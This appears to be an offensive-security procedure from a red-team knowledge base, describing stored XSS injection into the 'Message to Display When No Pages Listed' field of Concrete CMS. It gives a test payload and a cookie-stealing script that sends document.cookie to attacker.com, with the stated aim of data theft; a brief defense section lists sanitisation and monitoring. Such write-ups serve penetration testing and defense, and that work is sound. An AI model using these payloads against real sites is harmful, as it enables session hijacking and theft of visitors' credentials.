---
tags:
  - xss-injection
  - payload
  - concrete-cms
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:35.389Z'
sub_techniques: []
id: ef029be2-f95c-4021-b957-d07c748e7265
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-into-Message-Field

## Summary

This procedure details the injection of a JavaScript payload into the unsanitized 'Message to Display When No Pages Listed' field in Concrete CMS to exploit stored XSS.

## Description

The vulnerability stems from improper sanitization of user input in the admin configuration, allowing HTML and JavaScript to be stored and rendered directly. By breaking out of the expected text context with a closing quote and tag, an onerror event triggers script execution when the message is displayed in no-pages views, impacting authenticated and unauthenticated users alike.

## Requirements

1. Access to the admin configuration form from the previous procedure
2. Knowledge of effective XSS payloads (e.g., for testing or exploitation)
3. Browser developer tools to inspect input handling if needed

## Defense

Defensive measures and detection strategies:

- Sanitize all user inputs with HTML entity encoding or libraries like DOMPurify
- Validate and escape outputs in templates rendering configuration data
- Monitor for anomalous script tags in database-stored content

## Objectives

1. Insert executable JavaScript without form rejection
2. Ensure payload survives storage
3. Target client-side execution for data theft or manipulation

## Instructions

### Step 1: Enter Basic Test Payload

**Context**: Use a simple payload to confirm vulnerability without advanced evasion.

In the message field, input: `"><img src=x onerror=alert(1)>`

> This closes any attribute or tag context and injects an image with an onerror handler that alerts on load failure.

### Step 2: Advanced Payload for Exploitation

**Context**: Escalate to a payload that steals sensitive data.

Replace with: `"><script>document.location='http://attacker.com/?cookie='+document.cookie</script>`

> On execution, this exfiltrates cookies to an attacker-controlled server.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss-injection]]
- [[payload]]
